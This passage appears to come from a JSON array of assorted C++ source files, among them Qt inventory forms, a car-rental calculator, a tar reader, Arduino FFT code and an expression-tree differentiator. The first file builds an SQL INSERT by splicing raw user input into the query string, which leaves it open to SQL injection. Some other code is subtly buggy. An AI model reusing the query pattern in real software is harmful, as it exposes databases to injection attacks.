ui->lineEditProject->text();\r\n    QString stockSuplier = ui->lineEditSuplier->text();\r\n    QString stockMag = ui->lineEditManger->text();\r\n    QString stockOther = ui->textEditOther->toPlainText();\r\n    QString stockInputTime = QDateTime::currentDateTime().toString(\"yyyy-MM-dd HH:mm:ss\");\r\n\r\n    if(ui->lineEditId->text().isEmpty()){\r\n        QMessageBox::critical(this,\"Tips\", \"\u6837\u54c1\u7f16\u53f7\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->lineEditId->setFocus();\r\n        return;\r\n    }\r\n    if(ui->lineEditName->text().isEmpty()){\r\n        QMessageBox::critical(this,\"Tips\", \"\u6837\u54c1\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->lineEditName->setFocus();\r\n        return;\r\n    }\r\n    if(ui->lineEditCount->text().isEmpty()){\r\n        QMessageBox::critical(this,\"Tips\", \"\u6837\u54c1\u6570\u91cf\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->lineEditCount->setFocus();\r\n        return;\r\n    }\r\n    if(ui->lineEditProject->text().isEmpty()){\r\n        QMessageBox::critical(this,\"Tips\", \"\u68c0\u9a8c\u9879\u76ee\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->lineEditProject->setFocus();\r\n        return;\r\n    }\r\n    if(ui->lineEditSuplier->text().isEmpty()){\r\n        QMessageBox::critical(this,\"Tips\", \"\u59d4\u6258\u5355\u4f4d\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->lineEditSuplier->setFocus();\r\n        return;\r\n    }\r\n    if(ui->lineEditManger->text().isEmpty()){\r\n        QMessageBox::critical(this,\"Tips\", \"\u8d1f\u8d23\u4eba\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->lineEditManger->setFocus();\r\n        return;\r\n    }\r\n\r\n    QString addstr = QString(\"insert into stockdata(stockid, stockname, count, project, supplier, manager, whentimein, other) \"\r\n                             \"values('%1','%2','%3','%4','%5','%6','%7','%8')\")\r\n                         .arg(stockId).arg(stockName).arg(stockCount).arg(stockProject).arg(stockSuplier)\r\n                         .arg(stockMag).arg(stockInputTime).arg(stockOther);\r\n    //QMessageBox::information(this, \"msg\", addstr);\r\n\r\n    QSqlQuery sqlquery;\r\n    if(sqlquery.exec(addstr)){\r\n        QMessageBox::information(this, \"Tips\",\"\u6837\u54c1\u6dfb\u52a0\u6210\u529f\uff01\");\r\n    }\r\n    else{\r\n        QMessageBox::information(this, \"Tips\",\"\u6837\u54c1\u6dfb\u52a0\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u6dfb\u52a0\u3002\");\r\n    }\r\n}\r\n\r\n\r\nvoid inputStock::on_cancelBtn_clicked()\r\n{\r\n    close();\r\n}\r\n\r\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Price {\n    int days_of_rent;\n    float distance_travel;\n    float car_price_for_days;\n    float car_price_for_distance_travel;\n    float total_price;\n};\n\nstruct Car {\n    string make;\n    string model;\n    int year;\n    double daily_rent;\n    Price car_price;\n};\n\nstruct Customer {\n    string customer_National_id;\n    string customer_full_name;\n    string customer_phone_number;\n    Car car_taking[1];\n};\n\nCar carList[5] = {\n    {\"Toyota\", \"Corolla\", 2020, 50.0},\n    {\"Honda\", \"Civic\", 2018, 45.0},\n    {\"Ford\", \"Mustang\", 2022, 75.0},\n    {\"Chevrolet\", \"Silverado\", 2019, 60.0},\n    {\"Nissan\", \"Altima\", 2021, 55.0}\n};\n\nCustomer addCustomer();\nvoid assignCar(Customer&);\nvoid addPrice(Customer&);\nfloat calculateCarPriceForDays(float, int);\nfloat calculateCarPriceForDistance(float);\nfloat calculateTotalPrice(float, float);\n\nint main() {\n    Customer cust;\n    cust = addCustomer();\n    assignCar(cust);\n    addPrice(cust);\n\n    return 0;\n}\n\nCustomer addCustomer() {\n    Customer custo;\n    cout << \"Enter National_ID: \";\n    cin >> custo.customer_National_id;\n\n    cout << \"Enter Full name: \";\n    cin.ignore();\n    getline(cin, custo.customer_full_name);\n\n    cout << \"Enter phone number: \";\n    cin.ignore();\n    getline(cin, custo.customer_phone_number);\n\n    return custo;\n}\n\nvoid assignCar(Customer& tmpS) {\n    short choice;\n\n    cout << \"List of available cars:\\n---------------\\n\";\n\n    for (int i = 0; i < 5; i++) {\n        cout << i + 1 << \". Make: \" << carList[i].make << \", Model: \" << carList[i].model << \", Year: \" << carList[i].year << \", Daily rent: \" << carList[i].daily_rent << endl;\n    }\n\n    cout << \"---------------\\nSelect a car: \";\n    cin >> choice;\n\n    tmpS.car_taking[0] = carList[choice - 1];\n}\n\nvoid addPrice(Customer& tmpS) {\n    system(\"cls\");\n\n    cout << tmpS.customer_full_name << \"( \" << tmpS.customer_National_id << \" )\"<< \"( \"<< tmpS.customer_phone_number << \" )\\n\";\n\n    cout << \"\\n--------------\\n\"\n         << \"Make: \" << tmpS.car_taking[0].make << \", Model: \" << tmpS.car_taking[0].model << \", Year: \" << tmpS.car_taking[0].year << \", Daily rent: \" << tmpS.car_taking[0].daily_rent << endl;\n\n    cout << \"Days of rent: \";\n    cin >> tmpS.car_taking[0].car_price.days_of_rent;\n\n    tmpS.car_taking[0].car_price.car_price_for_days = calculateCarPriceForDays(tmpS.car_taking[0].daily_rent, tmpS.car_taking[0].car_price.days_of_rent);\n\n    cout << \"Distance traveled (in km): \";\n    cin >> tmpS.car_taking[0].car_price.distance_travel;\n\n    tmpS.car_taking[0].car_price.car_price_for_distance_travel = calculateCarPriceForDistance(tmpS.car_taking[0].car_price.distance_travel);\n\n    tmpS.car_taking[0].car_price.total_price = calculateTotalPrice(tmpS.car_taking[0].car_price.car_price_for_days, tmpS.car_taking[0].car_price.car_price_for_distance_travel);\n\n    cout << \"Total price: $\" << tmpS.car_taking[0].car_price.total_price << endl;\n}\n\nfloat calculateCarPriceForDays(float daily_rent, int days_of_rent) {\n    return daily_rent * days_of_rent;\n}\n\nfloat calculateCarPriceForDistance(float distance_travel) {\n    const float price_per_km = 0.5;\n    return distance_travel * price_per_km;\n}\n\nfloat calculateTotalPrice(float car_price_for_days, float car_price_for_distance_travel) {\n    return car_price_for_days + car_price_for_distance_travel;\n}\n",
    "#include <iostream>\n#include <string>\n#include <stdio.h>\n#include <fstream>//file handling\n#include \"file.h\"\nusing namespace std;\n\nvoid menu()\n     {\n     cout <<\"--------------------------------------\"<<endl;\n     cout << \"Welcome to Ai's period tracker!!\" << endl;\n     cout <<\"--------------------------------------\" << endl;\n     cout << \"What would you like to do?\"<< endl;\n     cout <<\"1) input PMS data\"<< endl;\n     cout <<\"2) input Period data\"<< endl;\n     cout <<\"3) Display past period record\"<< endl;\n     cout <<\"4) Display past PMS record\"<< endl;\n     cout <<\"-------------------------------------\" << endl;\n     cout << \"Please enter the number which you would like to do: \";\n     int choice;\n     cin >> choice;//\u3053\u3053\u3067exeption handling\u5165\u308c\u308b\u3002\ntry{\n               if(choice == 1)\n               {\n               PMS *A = new PMS;\n               file *B = new file;\n               B->file::add_PMS(A->PMS::str_getter());//method\n               delete A;\n               delete B;\n               }\n               if(choice == 2)\n               {\n               Period *Ap = new Period;\n               file *Bp = new file;\n               Bp->file::add_Period(Ap->Period::str_getter());\n               delete Ap;\n               delete Bp;\n               }\n               if(choice == 3)\n               {\n               file *B3 =  new file;\n               B3->file::read_Period();\n               \n               delete B3;\n               }\n               if(choice == 4)\n               {\n               file *B4 = new file;\n               B4->file::read_PMS();\n               delete B4;\n               }\n     \n               if(choice < 1 || choice > 4)\n               {\n                    throw(choice);\n               }\n          \n}\n     \n     catch(int e)\n          {\n               cout<<\"There is no such option! Please enter the number 1 to 4\"<<endl;\n          }\n     catch(...)\n          {\n               //cout<<\"unknown error\"<<endl;\n               //cout<<choice<<endl;\n               exit(1);\n          }\n}\n\n\nint main()\n{\n     ofstream fileName1(\"PMS.txt\", ios::app);//\u30d5\u30a1\u30a4\u30eb\u306e\u4f5c\u6210\n          if (!fileName1)\n          {\n               cout << \"File did not open\" << endl;\n          }\n          fileName1.close();\n\n     ofstream fileName2(\"Period.txt\",ios::app);\n          if(!fileName2)\n          {\n               cout<<\"fail to open the file\"<<endl;\n          }\n          fileName2.close();\n     menu();\n     return 0;\n}",
    "#include \"ParallelTarReader.h\"\n#include <iostream>\n#include <archive.h>\n#include <archive_entry.h>\n\nParallelTarReader::ParallelTarReader(const std::vector<std::string>& shardlist, size_t buffer_limit, size_t N, const std::vector<std::string>& schema)\n    : shardlist_(shardlist), buffer_limit_(buffer_limit), N_(N), schema_(schema), stop_(false) {\n    startThreads();\n}\n\nParallelTarReader::~ParallelTarReader() {\n    stopAndJoinThreads();\n}\n\nvoid ParallelTarReader::reset() {\n    stopAndJoinThreads();\n    clearBuffer();\n    stop_ = false;\n    startThreads();\n}\n\nbool ParallelTarReader::is_valid_sequence(const std::vector<std::pair<std::string, std::string>>& data_sequence) const {\n    if (data_sequence.size() != schema_.size()) {\n        return false;\n    }\n    for (size_t i = 0; i < schema_.size(); ++i) {\n        if (data_sequence[i].second.find(schema_[i]) == std::string::npos) {\n            return false;\n        }\n    }\n    return true;\n}\n\nstd::vector<std::vector<std::pair<std::string, std::string>>> ParallelTarReader::get_next_n_data(size_t n) {\n    std::vector<std::vector<std::pair<std::string, std::string>>> data;\n    std::unique_lock<std::mutex> lock(mutex_);\n\n    while (data.size() < n) {\n        cond_var_.wait(lock, [this, n]() { return buffer_.size() >= n || stop_; });\n\n        while (data.size() < n && !buffer_.empty()) {\n            data.push_back(std::move(buffer_.front()));\n            buffer_.pop();\n        }\n\n        if (stop_ && buffer_.empty()) {\n            break;\n        }\n    }\n    return data;\n}\n\nvoid ParallelTarReader::tarReaderThread(size_t index) {\n    struct archive* a = archive_read_new();\n    struct archive_entry* entry;\n\n    archive_read_support_format_tar(a);\n    archive_read_support_compression_gzip(a);\n\n    if (archive_read_open_filename(a, shardlist_[index].c_str(), 10240) != ARCHIVE_OK) {\n        std::cerr << \"Could not open tar file: \" << shardlist_[index] << std::endl;\n        archive_read_free(a);\n        return;\n    }\n\n    std::vector<std::pair<std::string, std::string>> sequence_buffer;\n\n    while (archive_read_next_header(a, &entry) == ARCHIVE_OK) {\n        std::string filename = archive_entry_pathname(entry);\n        size_t size = archive_entry_size(entry);\n        std::string buffer(size, '\\0');\n        archive_read_data(a, &buffer[0], size);\n\n        {\n            std::unique_lock<std::mutex> lock(mutex_);\n            cond_var_.wait(lock, [this]() { return buffer_.size() < buffer_limit_; });\n\n            sequence_buffer.emplace_back(std::move(buffer), filename);\n\n            if (sequence_buffer.size() == schema_.size()) {\n                if (is_valid_sequence(sequence_buffer)) {\n                    buffer_.emplace(std::move(sequence_buffer));\n                    cond_var_.notify_all();\n                }\n                sequence_buffer.clear();\n            }\n        }\n\n        archive_read_data_skip(a);\n    }\n\n    archive_read_free(a);\n\n    {\n        std::unique_lock<std::mutex> lock(mutex_);\n        stop_ = true;\n        cond_var_.notify_all();\n    }\n}\n\nvoid ParallelTarReader::stopAndJoinThreads() {\n    {\n        std::unique_lock<std::mutex> lock(mutex_);\n        stop_ = true;\n        cond_var_.notify_all();\n    }\n    for (auto& thread : threads_) {\n        if (thread.joinable()) {\n            thread.join();\n        }\n    }\n    threads_.clear();\n}\n\nvoid ParallelTarReader::clearBuffer() {\n    std::unique_lock<std::mutex> lock(mutex_);\n    while (!buffer_.empty()) {\n        buffer_.pop();\n    }\n}\n\nvoid ParallelTarReader::startThreads() {\n    for (size_t i = 0; i < shardlist_.size(); ++i) {\n        threads_.emplace_back(&ParallelTarReader::tarReaderThread, this, i);\n    }\n}\n",
    "/**\n * @file gear_chunking.cpp\n * @author WASL\n * @brief Implementations for gear chunking technique\n * @version 0.1\n * @date 2023-4-1\n *\n * @copyright Copyright (c) 2023\n *\n */\n\n#include \"gear_chunking.hpp\"\n\n#include <cmath>\n#include <cstring>\n#include <fstream>\n#include <iostream>\n#include <memory>\n\nGear_Chunking::Gear_Chunking(const Config& config) {\n    min_block_size = config.get_gear_min_block_size();\n    max_block_size = config.get_gear_max_block_size();\n    avg_block_size = config.get_gear_avg_block_size();\n\n    int number_of_ones = log2(avg_block_size);\n\n    // to produce chunks that are 8KB. Using the\n    // formula log2(8192) = 13, we can use a mask with the 13 most-significant\n    // bits set to 1\n    mask = 0x0000000000000000;\n    for (int i = 0; i < 64; i++) {\n        if (number_of_ones-- > 0) {\n            mask += 1;\n        }\n        mask = mask << 1;\n    }\n\n    mask = 0b1111111111100000000000000000000000000000000000000000000000000000;\n}\n\nuint64_t Gear_Chunking::ghash(uint64_t h, unsigned char ch) {\n    return ((h << 1) + GEAR_TABLE[ch]);\n}\n\nuint64_t Gear_Chunking::find_cutpoint(char* data, uint64_t size) {\n    uint64_t hash = 0;\n    uint64_t idx = 0;\n\n    // If given data is lower than the minimum chunk size, return data length.\n    //if (size <= min_block_size) {\n    //    return size;\n    //}\n\n    while (idx < size && idx < max_block_size) {\n        hash = ghash(hash, data[idx]);\n        if (!(hash & mask)) {\n            return idx;\n        }\n        idx += 1;\n    }\n\n    return idx;\n}\n\n",
    "#include \"Flight.h\"\n#include <iostream>\n\n// \u6784\u9020\u51fd\u6570\nFlight::Flight(std::string fid, std::string pid, std::string orig, std::string dest, std::string dTime, std::string aTime, double p)\n    : flightID(fid), planeID(pid), origin(orig), destination(dest), departureTime(dTime), arrivalTime(aTime), price(p) {}\n\n// \u83b7\u53d6\u5c5e\u6027\u7684\u65b9\u6cd5\nstd::string Flight::getFlightID() const {\n    return flightID;\n}\n\nstd::string Flight::getPlaneID() const {\n    return planeID;\n}\n\nstd::string Flight::getOrigin() const {\n    return origin;\n}\n\nstd::string Flight::getDestination() const {\n    return destination;\n}\n\nstd::string Flight::getDepartureTime() const {\n    return departureTime;\n}\n\nstd::string Flight::getArrivalTime() const {\n    return arrivalTime;\n}\n\ndouble Flight::getPrice() const {\n    return price;\n}\n\n// \u8bbe\u7f6e\u5c5e\u6027\u7684\u65b9\u6cd5\nvoid Flight::setFlightID(const std::string &fid) {\n    flightID = fid;\n}\n\nvoid Flight::setPlaneID(const std::string &pid) {\n    planeID = pid;\n}\n\nvoid Flight::setOrigin(const std::string &orig) {\n    origin = orig;\n}\n\nvoid Flight::setDestination(const std::string &dest) {\n    destination = dest;\n}\n\nvoid Flight::setDepartureTime(const std::string &dTime) {\n    departureTime = dTime;\n}\n\nvoid Flight::setArrivalTime(const std::string &aTime) {\n    arrivalTime = aTime;\n}\n\nvoid Flight::setPrice(double p) {\n    price = p;\n}\n\n// \u4fdd\u5b58Flight\u5bf9\u8c61\u5230\u6587\u4ef6\nvoid Flight::saveToFile(std::ofstream &out) const {\n    out << flightID << std::endl;\n    out << planeID << std::endl;\n    out << origin << std::endl;\n    out << destination << std::endl;\n    out << departureTime << std::endl;\n    out << arrivalTime << std::endl;\n    out << price << std::endl;\n}\n\n// \u4ece\u6587\u4ef6\u8bfb\u53d6Flight\u5bf9\u8c61\nvoid Flight::loadFromFile(std::ifstream &in) {\n    std::getline(in, flightID);\n    std::getline(in, planeID);\n    std::getline(in, origin);\n    std::getline(in, destination);\n    std::getline(in, departureTime);\n    std::getline(in, arrivalTime);\n    in >> price;\n    in.ignore(); // \u5ffd\u7565\u6362\u884c\u7b26\n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n#include <QToolTip>\r\n#include <QMessageBox>\r\n#include <QDebug>\r\n#include <QJsonDocument>\r\n#include <QJsonObject>\r\n#include <QJsonArray>\r\n#include <QFile>\r\n#include <QFileDialog>\r\n\r\nMainWindow::MainWindow(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n\r\n}\r\n\r\nMainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\n\r\nvoid MainWindow::on_PB_compress_clicked()\r\n{\r\n    QString filename = QFileDialog::getOpenFileName(this, \"Select File to Import\", QDir::homePath(), \"Text Files (*.txt *.log)\");\r\n    if (!filename.isEmpty()) {\r\n        if (importDataFromFile(filename)) {\r\n            // \u5bfc\u5165\u6210\u529f\r\n            QMessageBox::information(this, \"\u5bfc\u5165\u6210\u529f\", \"Data imported successfully from file: \" + filename);\r\n            // \u5237\u65b0\u754c\u9762\u663e\u793a\r\n        } else {\r\n            // \u5bfc\u5165\u5931\u8d25\r\n            QMessageBox::warning(this, \"\u5bfc\u5165\u5931\u8d25\", \"Failed to import data from file: \" + filename);\r\n        }\r\n    }\r\n}\r\nbool MainWindow::importDataFromFile(const QString &filename) {\r\n       QFile file(filename);\r\n       if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n           qDebug() << \"Failed to open file for reading:\" << filename;\r\n           return false;\r\n       }\r\n\r\n       QTextStream in(&file);\r\n       QStringList lines;\r\n       while (!in.atEnd()) {\r\n           QString line = in.readLine();\r\n           lines.append(line);\r\n       }\r\n\r\n       // \u5c06\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u50a8\u5b58\u5728\u4e86lines\u4e2d\r\n      //\u53ef\u4ee5\u5728\u8fd9\u91cc\u5bf9\u5b57\u7b26\u8fdb\u884c\u5904\u7406\r\n     qDebug() <<lines;\r\n       file.close();\r\n       return true;\r\n   }\r\n\r\n",
    "#include <fft.h>\r\n#include <OLED.h>\r\nextern int distances[MAX_SAMPLES];\r\nfloat frequency;\r\nint number=0;\r\nfloat fre=0;\r\nArduinoFFT<double> FFT;\r\nvoid fft()\r\n{\r\n  float sumvReal=0;\r\n      // \u6267\u884cFFT\u5904\u7406\r\n  double vReal[MAX_SAMPLES];\r\n  double vImag[MAX_SAMPLES];\r\n  double maxvReal=0;\r\n  for (int i = 0; i < MAX_SAMPLES; i++) {\r\n    // \u5c06\u8ddd\u79bb\u6570\u636e\u5b58\u50a8\u5230vReal\u6570\u7ec4\u4e2d\r\n    vReal[i] = distances[i];\r\n    // \u865a\u90e8\u7f6e\u4e3a0\r\n    vImag[i] = 0;\r\n  }\r\n\r\n  // \u6267\u884cFFT\r\n  FFT.windowing(vReal, MAX_SAMPLES, FFT_WIN_TYP_HAMMING, FFT_FORWARD);\r\n  FFT.compute(vReal, vImag, MAX_SAMPLES, FFT_FORWARD);//\u6267\u884c FFT \u8ba1\u7b97\r\n  FFT.complexToMagnitude(vReal, vImag, MAX_SAMPLES);//\u8ba1\u7b97\u590d\u6570\u5e45\u5ea6\r\n  // \u6253\u5370\u9891\u7387\u5206\u91cf\r\n  for (int i = 0; i < MAX_SAMPLES / 2; i++) {\r\n    frequency = ((float)i * SAMPLE_FREQ) / MAX_SAMPLES; //0\u52304.84hz\r\n    if(frequency>=1.56&&frequency<=3.91)\r\n    {\r\n      sumvReal+=vReal[i];\r\n      if(vReal[i]>vReal[i-1] && vReal[i]>maxvReal){//\u5bfb\u627e\u5e45\u5ea6\u6700\u5927\u503c\r\n        maxvReal=vReal[i];\r\n        \r\n        fre=frequency;\r\n      }\r\n\r\n    }\r\n    else if(frequency>3.91){\r\n      sumvReal=sumvReal-maxvReal;\r\n      if(maxvReal<700 && maxvReal>65&&maxvReal>2.8*(sumvReal/15))//\u632f\u52a8\u7684\u5e45\u5ea6\u8d8a\u4f4e\uff0cmaxveal\u5c31\u9700\u8981\u8c03\u7684\u8d8a\u4f4e\r\n      {\r\n      //Serial.print(\"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\");\r\n      number+=1;\r\n      //\u8702\u9e23\u5668\r\n      digitalWrite(beep_pin,1);//\u5f15\u811a\u8f93\u51fa\u7535\u5e73\u7ffb\u8f6c\r\n      delay(3000);//\u5ef6\u65f63s\r\n      digitalWrite(beep_pin,0);//\u5f15\u811a\u8f93\u51fa\u7535\u5e73\u7ffb\u8f6c\r\n      break;\r\n      }\r\n      break;\r\n    }\r\n\r\n\r\n    //Serial.print(frequency);\r\n    //Serial.print(\" Hz: \");\r\n    //Serial.println(vReal[i]);    //\u5e45\u5ea6\r\n\r\n\r\n\r\n\r\n\r\n  }\r\n\r\n  // \u7b49\u5f85\u4e0b\u4e00\u6b21\u91c7\u6837\r\n  //delay(1000);\r\n\r\n\r\n}",
    "#include \"include/constants.h\"\r\n#include <cmath>\r\n#include <json/json.h>\r\n#include <fstream>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconstpar::constpar(string filename)\r\n{\r\n    Json::Reader reader;\r\n    Json::Value  cfg;\r\n    ifstream     paramfile(filename);\r\n\r\n    paramfile >> cfg;\r\n\r\n    // Integrated Brownian motion \r\n    bm_sigma  = cfg[\"BM\"][\"bm_sigma\"].asDouble();   \r\n\r\n    // data\r\n    sampling_frequency = cfg[\"data\"][\"sampling_frequency\"].asDouble();\r\n\r\n    // Preprocessing\r\n    baseline_frames     = cfg[\"preproc\"][\"baseline_frames\"].asInt();\r\n    nospike_before      = cfg[\"preproc\"][\"nospike_before\"].asInt();\r\n    normalization_index = cfg[\"preproc\"][\"normalization_index\"].asInt();\r\n\r\n    // Priors\r\n    alpha_rate_b0        = cfg[\"priors\"][\"alpha rate 0\"].asDouble();\r\n    beta_rate_b0         = cfg[\"priors\"][\"beta rate 0\"].asDouble();\r\n    alpha_rate_b1        = cfg[\"priors\"][\"alpha rate 1\"].asDouble();\r\n    beta_rate_b1         = cfg[\"priors\"][\"beta rate 1\"].asDouble();\r\n    alpha_w01       = cfg[\"priors\"][\"alpha w01\"].asDouble();\r\n    beta_w01        = cfg[\"priors\"][\"beta w01\"].asDouble();\r\n    alpha_w10       = cfg[\"priors\"][\"alpha w10\"].asDouble();\r\n    beta_w10        = cfg[\"priors\"][\"beta w10\"].asDouble();\r\n    alpha_sigma2    = cfg[\"priors\"][\"alpha sigma2\"].asDouble();\r\n    beta_sigma2     = cfg[\"priors\"][\"beta sigma2\"].asDouble();\r\n    G_tot_mean      = cfg[\"priors\"][\"G_tot mean\"].asDouble();\r\n    G_tot_sd        = cfg[\"priors\"][\"G_tot sd\"].asDouble();\r\n    gamma_mean      = cfg[\"priors\"][\"gamma mean\"].asDouble();\r\n    gamma_sd        = cfg[\"priors\"][\"gamma sd\"].asDouble();\r\n    DCaT_mean       = cfg[\"priors\"][\"DCaT mean\"].asDouble();\r\n    DCaT_sd         = cfg[\"priors\"][\"DCaT sd\"].asDouble();\r\n    Rf_mean         = cfg[\"priors\"][\"Rf mean\"].asDouble();\r\n    Rf_sd           = cfg[\"priors\"][\"Rf sd\"].asDouble();\r\n    gam_in_mean     = cfg[\"priors\"][\"gam_in mean\"].asDouble();\r\n    gam_in_sd       = cfg[\"priors\"][\"gam_in sd\"].asDouble();\r\n    gam_out_mean    = cfg[\"priors\"][\"gam_out mean\"].asDouble();\r\n    gam_out_sd      = cfg[\"priors\"][\"gam_out sd\"].asDouble();\r\n\r\n    seed                = cfg[\"MCMC\"][\"seed\"].asInt();\r\n    niter               = cfg[\"MCMC\"][\"niter\"].asInt();\r\n    nparticles          = cfg[\"MCMC\"][\"nparticles\"].asInt();\r\n    SAMPLE_PARAMETERS   = cfg[\"MCMC\"][\"SAMPLE_PARAMETERS\"].asBool();\r\n    KNOWN_SPIKES        = cfg[\"MCMC\"][\"KNOWN_SPIKES\"].asBool();\r\n\r\n    // proposals\r\n    G_tot_prop_sd   = cfg[\"proposals\"][\"G_tot prop sd\"].asDouble();\r\n    gamma_prop_sd  = cfg[\"proposals\"][\"gamma prop sd\"].asDouble();\r\n    DCaT_prop_sd   = cfg[\"proposals\"][\"DCaT prop sd\"].asDouble();\r\n    Rf_prop_sd     = cfg[\"proposals\"][\"Rf prop sd\"].asDouble();\r\n    gam_in_prop_sd  = cfg[\"proposals\"][\"gam_in prop sd\"].asDouble();\r\n    gam_out_prop_sd = cfg[\"proposals\"][\"gam_out prop sd\"].asDouble();\r\n\r\n    // Integration of the GCaMP model\r\n    TSMode = cfg[\"ODE\"][\"time step mode\"].asInt();\r\n\r\n}\r\n\r\nvoid constpar::set_time_scales()\r\n{\r\n}\r\n\r\nvoid constpar::print()\r\n{\r\n    cout << \"________SETTINGS_____________\" << endl;\r\n    cout << \"_____________________________\" << endl;\r\n    cout << \"Brownian motion\" << endl;\r\n    cout << \"    sigma = \" << bm_sigma << endl;\r\n    cout << \"    sampling frequency = \" << sampling_frequency << endl;\r\n    cout << \"priors\" << endl;\r\n    cout << \"    alpha_sigma2 = \" << alpha_sigma2 << endl;\r\n    cout << \"    beta_sigma2 = \" << beta_sigma2 << endl;\r\n    cout << \"MCMC\" << endl;\r\n    cout << \"    niter = \" << niter << endl;\r\n    cout << \"    SAMPLE_PARAMETERS = \" << SAMPLE_PARAMETERS << endl;\r\n    cout << \"    CROP_TRACE          = \" << CROP_TRACE << endl;\r\n    cout << \"_____________________________\" << endl;\r\n}\r\n",
    "\n\n#include <iostream>\n#include \"arbre.h\"\n#include \"noeud.h\"\n#include \"ChaineDeSortie.h\"\n#include \"pile.h\"\n#include <cmath>\nusing namespace std;\n\n//----------------------------------------------  Question 4 ---------------------------------------------------------\n\n\narbre::arbre() {\n    racine = nullptr; // initialisation de la racine\n}\n\narbre::arbre(noeud *racine) {\n    this->racine = racine; // initialisation de la racine\n}\n\narbre::arbre(string expinf) {\n    ChaineDeSortie o; \n    o.InfToSuf(expinf);\n    o.afficher(); \n    pile pi; \n    noeud* current = o.get(); \n    for (int i = 0; i < o.getcount(); i++) {\n        if (current->type == 'r' || current->type == 'v') {\n            pi.empiler(current);\n        } else {\n            current->fd = pi.depiler();\n            current->fg = pi.depiler();\n            pi.empiler(current);\n        }\n        current = current->Osuivant;\n    }\n    this->racine = pi.depiler(); \n}\n\nvoid arbre::afficher() {\n    if (racine != nullptr) {\n        afficherRecursive(racine, \"\", true);\n    }\n}\n\n\n\n\nvoid arbre::afficherRecursive(noeud *noeudActuel, string miseEnPage, bool estDernier) {\n    cout << miseEnPage << \"|-- \";\n    if (noeudActuel->type == 'o') {\n        cout << \"Operateur: \" << noeudActuel->ope << endl;\n    } else if (noeudActuel->type == 'r') {\n        cout << \"Valeur: \" << noeudActuel->val << endl;\n    } else if (noeudActuel->type == 'v') {\n        cout << \"Variable: \" << noeudActuel->var << endl;\n    }\n    string nouveauPrefixe = miseEnPage + (estDernier ? \"    \" : \"|   \");\n    if (noeudActuel->fg != nullptr) {\n        afficherRecursive(noeudActuel->fg, nouveauPrefixe, false);\n    }\n    if (noeudActuel->fd != nullptr) {\n        afficherRecursive(noeudActuel->fd, nouveauPrefixe, true);\n    }\n}\n\nvoid arbre::afficherInfixe() {\n    if (racine != nullptr) {\n        afficherInfixe(racine);\n        cout << endl;\n    }\n}\n\nvoid arbre::afficherInfixe(noeud* noeudActuel) {\n    if (noeudActuel != nullptr) {\n        if (noeudActuel->type == 'r') {\n            cout << noeudActuel->val;\n        } else if (noeudActuel->type == 'v') {\n            cout << noeudActuel->var;\n        } else if (noeudActuel->type == 'o') {\n            cout << \"(\";\n            afficherInfixe(noeudActuel->fg);\n            cout << \" \" << noeudActuel->ope << \" \";\n            afficherInfixe(noeudActuel->fd);\n            cout << \")\";\n        }\n    }\n}\n\nvoid arbre::deriver() {\n    if (racine != nullptr) {\n        cout << \"L'arbre repr\u00e9sentant votre d\u00e9riv\u00e9e : \" << endl;\n        noeud* deriveRacine = deriverRecursive(this->racine);\n        arbre *deriveA = new arbre(deriveRacine);\n        deriveA->afficher();\n        cout << endl;\n    }\n}\n\n\nnoeud* arbre::deriverRecursive(noeud *current) {\n    if (current->type == 'r') { \n        return new noeud(0.0f); // D\u00e9riv\u00e9e d'un nombre est 0\n    } else if (current->type == 'v') { \n        return new noeud(1.0f); // D\u00e9riv\u00e9e d'une variable est 1\n    } else {\n        if (current->ope == '+' || current->ope == '-') { // R\u00e8gle de d\u00e9rivation pour l'addition et la soustraction\n            noeud* deriv = new noeud(current->ope);\n            deriv->fg = deriverRecursive(current->fg);\n            deriv->fd = deriverRecursive(current->fd);\n            return deriv;\n        } else if (current->ope == '*') { // R\u00e8gle de d\u00e9rivation pour la multiplication\n            noeud* deriv = new noeud('+');\n            deriv->fg = new noeud('*');\n            deriv->fg->fg = deriverRecursive(current->fg);\n            deriv->fg->fd = current->fd;\n\n            deriv->fd = new noeud('*');\n            deriv->fd->fg = current->fg;\n            deriv->fd->fd = deriverRecursive(current->fd);\n            return deriv;\n        } else if (current->ope == '/') { // R\u00e8gle de d\u00e9rivation pour la division\n            noeud* deriv = new noeud('/');\n            deriv->fg = new noeud('-');\n            deriv->fg->fg = new noeud('*');\n            deriv->fg->fg->fg = deriverRecursive(current->fg);\n            deriv->fg->fg->fd = current->fd;\n\n            deriv->fg->fd = new noeud('*');\n            deriv->fg->fd->fg = current->fg;\n            deriv->fg->fd->fd = deriverRecursive(current->fd);\n\n            deriv->fd = new noeud('*');\n            deriv->fd->fg = current->fd;\n            deriv->fd->fd = current->fd;\n            return deriv;\n        } else if (current->ope == '^') { // R\u00e8gle de d\u00e9rivation pour la puissance\n            float exposant = current->fd->val; \n            if (exposant == 0) { // D\u00e9riv\u00e9e de la constante \u00e0 la puissance 0 est 0\n                return new noeud(0.0f);\n            } else {\n                noeud* deriv = new noeud('*');\n                deriv->fg = new noeud('*');\n                deriv->fg->fg = new noeud(exposant);\n                deriv->fg->fd = new noeud('^');\n                deriv->fg->fd->fg = current->fg;\n                deriv->fg->fd->fd = new noeud(exposant - 1);\n                deriv->fd = deriverRecursive(current->fg);\n                return deriv;\n            }\n        }\n    }\n    r",
